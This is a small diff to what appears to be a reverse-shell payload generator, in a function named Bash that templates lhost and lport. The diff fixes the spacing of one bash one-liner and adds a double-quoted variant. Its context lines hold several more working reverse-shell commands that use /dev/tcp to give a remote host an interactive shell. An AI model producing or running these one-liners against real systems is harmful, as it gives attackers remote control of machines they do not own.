@@ -47,8 +47,10 @@ def Bash(lhost,lport):
     
     #TCP
 
-    bash -c'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
+    bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
     
+    bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+
     bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
     
     0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196
